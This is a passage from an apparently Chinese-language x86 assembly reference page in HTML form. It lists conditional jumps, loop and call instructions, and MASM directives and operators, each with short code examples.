class=\"language-c++\">repe cmpsd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX0时重复\"><a href=\"#REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX0时重复\" class=\"headerlink\" title=\"REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX<>0时重复\"></a>REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">repne scasb<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"REPC-当CF-1且CX-ECX0时重复\"><a href=\"#REPC-当CF-1且CX-ECX0时重复\" class=\"headerlink\" title=\"REPC 当CF=1且CX/ECX<>0时重复\"></a>REPC 当CF=1且CX/ECX&lt;&gt;0时重复</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">repc movsb<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"REPNC-当CF-0且CX-ECX0时重复\"><a href=\"#REPNC-当CF-0且CX-ECX0时重复\" class=\"headerlink\" title=\"REPNC 当CF=0且CX/ECX<>0时重复\"></a>REPNC 当CF=0且CX/ECX&lt;&gt;0时重复</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">repnc movsb<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"程序转移指令\"><a href=\"#程序转移指令\" class=\"headerlink\" title=\"程序转移指令\"></a>程序转移指令</h1><h2 id=\"简单的条件转移指令\"><a href=\"#简单的条件转移指令\" class=\"headerlink\" title=\"简单的条件转移指令\"></a>简单的条件转移指令</h2><h3 id=\"JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转\"><a href=\"#JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转\" class=\"headerlink\" title=\"JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转\"></a>JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">cmp eax,0\njz/je L1;如果ZF=1则跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转\"><a href=\"#JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转\" class=\"headerlink\" title=\"JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转\"></a>JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">and dl,10110000b\njnz/jne L2;ZF=0跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"JS-OPR———————-结果为负转移-测试条件SF-1\"><a href=\"#JS-OPR———————-结果为负转移-测试条件SF-1\" class=\"headerlink\" title=\"JS OPR———————-结果为负转移, 测试条件SF=1\"></a>JS OPR———————-结果为负转移, 测试条件SF=1</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">SF=1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JNS-OPR———————结果为正转移-测试条件SF-0\"><a href=\"#JNS-OPR———————结果为正转移-测试条件SF-0\" class=\"headerlink\" title=\"JNS OPR———————结果为正转移, 测试条件SF=0\"></a>JNS OPR———————结果为正转移, 测试条件SF=0</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">SF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JO-OPR———————-溢出转移-测试条件OF-1\"><a href=\"#JO-OPR———————-溢出转移-测试条件OF-1\" class=\"headerlink\" title=\"JO OPR——————— 溢出转移,   测试条件OF=1\"></a>JO OPR——————— 溢出转移,   测试条件OF=1</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">OF=1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JNO-OPR-——————–不溢出转移-测试条件OF-0\"><a href=\"#JNO-OPR-——————–不溢出转移-测试条件OF-0\" class=\"headerlink\" title=\"JNO OPR ——————–不溢出转移 , 测试条件OF=0\"></a>JNO OPR ——————–不溢出转移 , 测试条件OF=0</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">OF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JP-OPR-———————结果为偶转移-测试条件PF-1\"><a href=\"#JP-OPR-———————结果为偶转移-测试条件PF-1\" class=\"headerlink\" title=\"JP OPR ———————结果为偶转移, 测试条件PF=1\"></a>JP OPR ———————结果为偶转移, 测试条件PF=1</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">PF=1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JNP-OPR-——————–结果为奇转移-测试条件PF-0\"><a href=\"#JNP-OPR-——————–结果为奇转移-测试条件PF-0\" class=\"headerlink\" title=\"JNP OPR ——————–结果为奇转移 , 测试条件PF=0\"></a>JNP OPR ——————–结果为奇转移 , 测试条件PF=0</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">PF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JC-OPR-——————–-有进位转移-测试条件CF-1\"><a href=\"#JC-OPR-——————–-有进位转移-测试条件CF-1\" class=\"headerlink\" title=\"JC OPR ——————– 有进位转移 , 测试条件CF=1\"></a>JC OPR ——————– 有进位转移 , 测试条件CF=1</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">CF=1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JNC-OPR-——————–无进位转移-测试条件CF-0\"><a href=\"#JNC-OPR-——————–无进位转移-测试条件CF-0\" class=\"headerlink\" title=\"JNC OPR ——————–无进位转移,  测试条件CF=0\"></a>JNC OPR ——————–无进位转移,  测试条件CF=0</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">CF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移\"><a href=\"#无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移\" class=\"headerlink\" title=\"无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)\"></a>无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)</h3><h3 id=\"JB-或JNAE-opd-————–小于或者不大于等于则转移\"><a href=\"#JB-或JNAE-opd-————–小于或者不大于等于则转移\" class=\"headerlink\" title=\"JB(或JNAE) opd ————–小于或者不大于等于则转移\"></a>JB(或JNAE) opd ————–小于或者不大于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">小于跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JNB-或JAE-opd—————不小于或者大于等于则转移\"><a href=\"#JNB-或JAE-opd—————不小于或者大于等于则转移\" class=\"headerlink\" title=\"JNB(或JAE) opd—————不小于或者大于等于则转移\"></a>JNB(或JAE) opd—————不小于或者大于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">不小于跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JA-或NJBE-OPD—————大于或者不小于等于则转移\"><a href=\"#JA-或NJBE-OPD—————大于或者不小于等于则转移\" class=\"headerlink\" title=\"JA(或NJBE) OPD—————大于或者不小于等于则转移\"></a>JA(或NJBE) OPD—————大于或者不小于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,+127\ncmp al,-128\n    ja/njbe L1;不跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"JNA-或JBE-OPD—————不大于或者小于等于则转移\"><a href=\"#JNA-或JBE-OPD—————不大于或者小于等于则转移\" class=\"headerlink\" title=\"JNA(或JBE) OPD—————不大于或者小于等于则转移\"></a>JNA(或JBE) OPD—————不大于或者小于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,+127\ncmp al,-128\n    jna/jbe L1;跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"带符号比较条件转移指令\"><a href=\"#带符号比较条件转移指令\" class=\"headerlink\" title=\"带符号比较条件转移指令\"></a>带符号比较条件转移指令</h3><h3 id=\"JL-或JNGE-————–小于或者不大于等于则转移\"><a href=\"#JL-或JNGE-————–小于或者不大于等于则转移\" class=\"headerlink\" title=\"JL(或JNGE) ————–小于或者不大于等于则转移\"></a>JL(或JNGE) ————–小于或者不大于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ax,5\nmov ax,6\n\tjl/jnge L1;跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"JNL-或JGE-————–不小于或者大于等于则转移\"><a href=\"#JNL-或JGE-————–不小于或者大于等于则转移\" class=\"headerlink\" title=\"JNL(或JGE)————–不小于或者大于等于则转移\"></a>JNL(或JGE)————–不小于或者大于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov edx,-1\ncmp edx,0\n    jnl/jge L1;不跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"JG-或NJLE-—————大于或者不小于等于则转移\"><a href=\"#JG-或NJLE-—————大于或者不小于等于则转移\" class=\"headerlink\" title=\"JG(或NJLE)—————大于或者不小于等于则转移\"></a>JG(或NJLE)—————大于或者不小于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ax,5\ncmp ax,4\n\tjp/njle L1;大于则跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"JNG-或JLE-—————不大于或者小于等于则转移\"><a href=\"#JNG-或JLE-—————不大于或者小于等于则转移\" class=\"headerlink\" title=\"JNG(或JLE)—————不大于或者小于等于则转移\"></a>JNG(或JLE)—————不大于或者小于等于则转移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ecx,0\ncmp ecx,0\n    jng/jle;跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"JCXZ\"><a href=\"#JCXZ\" class=\"headerlink\" title=\"JCXZ\"></a>JCXZ</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">CX=0跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JECXZ\"><a href=\"#JECXZ\" class=\"headerlink\" title=\"JECXZ\"></a>JECXZ</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">ECX=0跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"JRCXZ\"><a href=\"#JRCXZ\" class=\"headerlink\" title=\"JRCXZ\"></a>JRCXZ</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">RCX=0跳转<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"调用子程序与返回指令\"><a href=\"#调用子程序与返回指令\" class=\"headerlink\" title=\"调用子程序与返回指令\"></a>调用子程序与返回指令</h2><h3 id=\"CALL-子程序调用指令\"><a href=\"#CALL-子程序调用指令\" class=\"headerlink\" title=\"CALL  子程序调用指令\"></a>CALL  子程序调用指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">call SumOf;调用SumOf过程<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"RET-子程序返回指令\"><a href=\"#RET-子程序返回指令\" class=\"headerlink\" title=\"RET 子程序返回指令\"></a>RET 子程序返回指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">SumOf proc\n    .\n    .\n    ret\nSumOf endp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"条件循环指令\"><a href=\"#条件循环指令\" class=\"headerlink\" title=\"条件循环指令\"></a>条件循环指令</h2><h3 id=\"LOOP———-按ECX计算器循环\"><a href=\"#LOOP———-按ECX计算器循环\" class=\"headerlink\" title=\"LOOP———-按ECX计算器循环\"></a>LOOP———-按ECX计算器循环</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">    mov ax,0\n    mov ecx,5\nL1:\n    inc ax\n    loop L1;每次循环ax加一，循环5次<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"LOOPZ————为零跳转\"><a href=\"#LOOPZ————为零跳转\" class=\"headerlink\" title=\"LOOPZ————为零跳转\"></a>LOOPZ————为零跳转</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">loopz L1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LOOPNZ————–非零跳转\"><a href=\"#LOOPNZ————–非零跳转\" class=\"headerlink\" title=\"LOOPNZ————–非零跳转\"></a>LOOPNZ————–非零跳转</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">loopnz L1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LOOPE——————-相等跳转\"><a href=\"#LOOPE——————-相等跳转\" class=\"headerlink\" title=\"LOOPE——————-相等跳转\"></a>LOOPE——————-相等跳转</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">loope L1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LOOPNE——————-不等跳转\"><a href=\"#LOOPNE——————-不等跳转\" class=\"headerlink\" title=\"LOOPNE——————-不等跳转\"></a>LOOPNE——————-不等跳转</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">loopne L1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"IF-ELSE-ELSEIF-ENDIF\"><a href=\"#IF-ELSE-ELSEIF-ENDIF\" class=\"headerlink\" title=\".IF .ELSE .ELSEIF .ENDIF\"></a>.IF .ELSE .ELSEIF .ENDIF</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">.IF conditionl\n    statements\n[.ELSELF condition2\n\tstatements]\n[ELSE \n\tstatements]\n.ENDIF<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"REPEAT-WHILE\"><a href=\"#REPEAT-WHILE\" class=\"headerlink\" title=\".REPEAT .WHILE\"></a>.REPEAT .WHILE</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">.REPEAT \n    statements\n.UNTIL condition\n    \n.WHILE condition\n    statements\n.ENDW<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"其它指令\"><a href=\"#其它指令\" class=\"headerlink\" title=\"其它指令\"></a>其它指令</h2><h3 id=\"OFFSET-——————–-返回偏移地址\"><a href=\"#OFFSET-——————–-返回偏移地址\" class=\"headerlink\" title=\"OFFSET ——————– 返回偏移地址\"></a>OFFSET ——————– 返回偏移地址</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov esi,offset var1;  esi=00404000h\nmov esi,offset var2;  esi=00404000h<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"SEG-——————–-返回段地址\"><a href=\"#SEG-——————–-返回段地址\" class=\"headerlink\" title=\"SEG  ——————– 返回段地址\"></a>SEG  ——————– 返回段地址</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov esi,seg var1\nmov esi,seg var2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"EQU-——————–-等值语句\"><a href=\"#EQU-——————–-等值语句\" class=\"headerlink\" title=\"EQU(=) ——————– 等值语句\"></a>EQU(=) ——————– 等值语句</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">name EQU expression\nname EQU symbol\nname EQU &lt;text&gt;\n    \npressKey EQU &lt;\"Press any key to continue...\", 0&gt;\nmatrix1 EQU 10 * 10\nmatrix2 EQU &lt;10 * 10&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"PURGE-——————–-解除语句\"><a href=\"#PURGE-——————–-解除语句\" class=\"headerlink\" title=\"PURGE ——————– 解除语句\"></a>PURGE ——————– 解除语句</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">PURGE，标识符1，标识符2，...，标识符n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"DUP-——————–-操作数字段用复制操作符\"><a href=\"#DUP-——————–-操作数字段用复制操作符\" class=\"headerlink\" title=\"DUP  ——————– 操作数字段用复制操作符\"></a>DUP  ——————– 操作数字段用复制操作符</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">db x dup();x是重复的次数，（）里是要重复的数逗号分隔\nstr1 db 10 dup ('!@#') ;这就是十个！@#\n格式：db 重复的次数 dup (重复的内容)\nbuf1 db 100 dup(?);开辟100个字节的内存区<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"SEGMENT-ENDS-——————–-段定义指令\"><a href=\"#SEGMENT-ENDS-——————–-段定义指令\" class=\"headerlink\" title=\"SEGMENT,ENDS ——————– 段定义指令\"></a>SEGMENT,ENDS ——————– 段定义指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">segment_name SEGMENT 【定位类型】 【组合类型】 【类别名】\n···;here is your code\nsegment ends<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"ASSUME-——————–-段地址分配指令\"><a href=\"#ASSUME-——————–-段地址分配指令\" class=\"headerlink\" title=\"ASSUME ——————– 段地址分配指令\"></a>ASSUME ——————– 段地址分配指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">.data\n　　........\n.code\n　　........\n　　assume cs:code,ds:data\nstart: .......\n　　mov ax,data\n　　mov ds,ax\n　　...\nends\nend start\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"ORG-——————–-起始偏移地址设置指令\"><a href=\"#ORG-——————–-起始偏移地址设置指令\" class=\"headerlink\" title=\"ORG  ——————– 起始偏移地址设置指令\"></a>ORG  ——————– 起始偏移地址设置指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">ORG 0000H\nAJMP MAIN\nORG 0030H<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"——————–地址计数器的当前值\"><a href=\"#——————–地址计数器的当前值\" class=\"headerlink\" title=\"$   ——————–地址计数器的当前值\"></a>$   ——————–地址计数器的当前值</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">例如JNE+6，能引用地址计数器的值，每次引用会使地址计数器的值发生改变，地址计数器即当前指令的偏移地址。该指令的转向地址即JNE指令的首地址加6。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"PROC，ENDP-——————–-过程定义语句\"><a href=\"#PROC，ENDP-——————–-过程定义语句\" class=\"headerlink\" title=\"PROC，ENDP ——————– 过程定义语句\"></a>PROC，ENDP ——————– 过程定义语句</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">SumOf proc\n    .\n    .\n    .\n    ret\nSumOf endp;这是一个过程<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"NAME，TITLE，END-——————–-程序开始结束语句\"><a href=\"#NAME，TITLE，END-——————–-程序开始结束语句\" class=\"headerlink\" title=\"NAME，TITLE，END ——————– 程序开始结束语句\"></a>NAME，TITLE，END ——————– 程序开始结束语句</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"MACRO，ENDM-——————–宏定义指令\"><a href=\"#MACRO，ENDM-——————–宏定义指令\" class=\"headerlink\" title=\"MACRO，ENDM  ——————–宏定义指令\"></a>MACRO，ENDM  ——————–宏定义指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mPutchar MACRO char\n    push eax\n    mov al,char\n    call WriteChar\n    pop eax\n    ENDM<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"XLAT-（TRANSLATE）-——————–-换码指令—\"><a href=\"#XLAT-（TRANSLATE）-——————–-换码指令—\" class=\"headerlink\" title=\"XLAT  （TRANSLATE） ——————– 换码指令—-\"></a>XLAT  （TRANSLATE） ——————– 换码指令—-</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">X DW 1122h,3344h,5566h,7788h\nlea bx,X\nmov al,03h\nxlat<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"ALIGN-———————伪指令\"><a href=\"#ALIGN-———————伪指令\" class=\"headerlink\" title=\"ALIGN ———————伪指令\"></a>ALIGN ———————伪指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var byte ?; 00404000h\nALIGN 2\nvar2 byte ?; 00404002<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"PTR-———————-运算符\"><a href=\"#PTR-———————-运算符\" class=\"headerlink\" title=\"PTR ———————-运算符\"></a>PTR ———————-运算符</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var dword 12345678h\nmov ax,word ptr var; 将低16位(5678)送入ax<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"TYPE\"><a href=\"#TYPE\" class=\"headerlink\" title=\"TYPE\"></a>TYPE</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var word ?\nvar2 byte ?; word,byte都是type,分别代表2,1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"LENGTHOF-————–运算符\"><a href=\"#LENGTHOF-————–运算符\" class=\"headerlink\" title=\"LENGTHOF ————–运算符\"></a>LENGTHOF ————–运算符</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var1 byte 10,20,30;3\nvar2 word 30 DUP(?),0,0;32\nvar3 word 5 DUP(3 dup(?));3*5\nvar4 byte \"1234\",0;5<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"SIZFEOF————-运算符\"><a href=\"#SIZFEOF————-运算符\" class=\"headerlink\" title=\"SIZFEOF————-运算符\"></a>SIZFEOF————-运算符</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var word 32 dup(0)\nmov eax,sizeof var;eax=32*2=64<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"LABEL-—————伪指令\"><a href=\"#LABEL-—————伪指令\" class=\"headerlink\" title=\"LABEL —————伪指令\"></a>LABEL —————伪指令</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var1 label word\nvar2 dword 12345678h;公用一个内存位置，var2未分配空间\nmov ax,var1;5678h\nmov dx,[var+2];1234h<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"TYPEDEF————–运算符\"><a href=\"#TYPEDEF————–运算符\" class=\"headerlink\" title=\"TYPEDEF————–运算符\"></a>TYPEDEF————–运算符</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var typedef ptr byte;(指针)\n.data\n\tarray byte 10h,20h,30h\n    ptr1 var ?\n    ptr2 var array;指向一个数组<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"JMP-————无条件跳转到目标地址\"><a href=\"#JMP-————无条件跳转到目标地址\" class=\"headerlink\" title=\"JMP ————无条件跳转到目标地址\"></a>JMP ————无条件跳转到目标地址</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">top:\n.\n.\n    jmp top;不断循环<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"USES—————等于-push-pop\"><a href=\"#USES—————等于-push-pop\" class=\"headerlink\" title=\"USES—————等于 push+pop\"></a>USES—————等于 push+pop</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">ArraySum proc uses esi ecx\n    mov eax,0\nL1:\n\tadd eax,[esi]\n    add esi,type dword\n    loop L1\nArraySum endp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"CLC\"><a href=\"#CLC\" class=\"headerlink\" title=\"CLC\"></a>CLC</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">clc;清除标识位<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"STC\"><a href=\"#STC\" class=\"headerlink\" title=\"STC\"></a>STC</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">进位标志置1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"ENTER——————-被调用过程自动创建堆栈帧\"><a href=\"#ENTER——————-被调用过程自动创建堆栈帧\" class=\"headerlink\" title=\"ENTER——————-被调用过程自动创建堆栈帧\"></a>ENTER——————-被调用过程自动创建堆栈帧</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">Mysub proc\n\tenter 8,0\n;等效于\nMysub proc\n\tpush ebp\n\tmov ebp,esp\n\tsub esp,8<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"LEAVE——————指令结束一个过程的堆栈帧\"><a href=\"#LEAVE——————指令结束一个过程的堆栈帧\" class=\"headerlink\" title=\"LEAVE——————指令结束一个过程的堆栈帧\"></a>LEAVE——————指令结束一个过程的堆栈帧</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">Mysub proc\n\tenter 8,0\n\t.\n\t.\n\tleave\n\tret\nMysub endp\n;等效于\nMysub proc\n\tpush ebp\n\tmov ebp,esp\n\tsub esp,8\n\t.\n\t.\n\tmov esp,ebp\n\tpop ebp\n\tret\nMysub endp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"LOCAL—————局部变量\"><a href=\"#LOCAL—————局部变量\" class=\"headerlink\" title=\"LOCAL—————局部变量\"></a>LOCAL—————局部变量</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">Mysub proc\n\tlocal var:dword;这是一个局部变量<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"INVOKE—————–CALL替代品，一行调用多个参数\"><a href=\"#INVOKE—————–CALL替代品，一行调用多个参数\" class=\"headerlink\" title=\"INVOKE—————–CALL替代品，一行调用多个参数\"></a>INVOKE—————–CALL替代品，一行调用多个参数</h3><pre class=\"line-numbers 